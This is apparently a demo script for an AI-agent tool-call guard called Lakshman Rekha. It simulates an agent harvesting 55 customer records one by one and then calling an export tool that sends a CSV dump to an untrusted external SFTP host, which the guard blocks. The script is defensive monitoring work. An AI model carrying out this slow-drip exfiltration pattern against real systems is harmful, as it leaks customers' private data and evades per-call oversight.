"""
Lakshman Rekha Killer Demo 2: The "Slow-Drip" Data Exfiltration Attack Interception
Demonstrates how an agent attempting to harvest records one-by-one and then export them
is deterministically intercepted by Lakshman Rekha's state machine.
"""

import sys
import os

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from agentgate.engine import PolicyEngine, RuleAction

def run_slow_drip_demo():
    engine = PolicyEngine()
    
    agent_id = "analyst_agent_99"
    session_id = "sess_nightly_analytics"
    agent_role = "SupportAgent_Tier1"

    print("=" * 85)
    print("🛡️ LAKSHMAN REKHA — SLOW-DRIP EXFILTRATION DEFENSE DEMO")
    print("• Attack Vector: Agent reads individual customer records (slow-drip harvesting)")
    print("                 and subsequently triggers an external webhook/export.")
    print("• The Boundary:  Max 50 cumulative records in session before export lock.")
    print("=" * 85)

    # 1. Simulate 55 legitimate-looking single reads
    print("\n[Phase 1] Agent executes 55 individual 'read_customer_record' queries...")
    for i in range(1, 56):
        dec = engine.evaluate(
            tool_name="read_customer_record",
            tool_args={"customer_id": f"cus_{1000+i}"},
            session_id=session_id,
            agent_id=agent_id,
            agent_role=agent_role
        )
        if i in [1, 25, 50, 55]:
            print(f"  • Read #{i:02d}: {dec.action.value} (Session cumulative records read: {dec.records_accessed_in_session})")

    # 2. Agent now attempts the exfiltration trigger (Bulk Export / Webhook upload)
    print("\n[Phase 2] Agent attempts to trigger 'export_data_to_external_sftp'...")
    export_payload = {
        "destination": "sftp://untrusted-backup-server.com/drop",
        "format": "csv",
        "file_name": "q3_customer_dump.csv"
    }

    dec_export = engine.evaluate(
        tool_name="export_data_to_external_sftp",
        tool_args=export_payload,
        session_id=session_id,
        agent_id=agent_id,
        agent_role=agent_role
    )

    status_icon = "🛑 BLOCKED" if dec_export.action == RuleAction.BLOCK else "✅ ALLOWED"
    print(f"\n[Phase 3] Lakshman Rekha Verdict on Export Tool:")
    print(f"  • Status:           {status_icon} (in {dec_export.evaluation_time_ms} ms)")
    print(f"  • Risk Score:       {dec_export.risk_score} / 100")
    print(f"  • Reason:           {dec_export.reason}")
    print(f"  • Audit Receipt:    SHA-256 [{dec_export.cryptographic_receipt[:18]}...]")

    print("\n" + "=" * 85)
    print("🎯 DEMO RESULT: Stateless WAFs/IAM would allow the export. Lakshman Rekha blocked it.")
    print("=" * 85)

if __name__ == '__main__':
    run_slow_drip_demo()
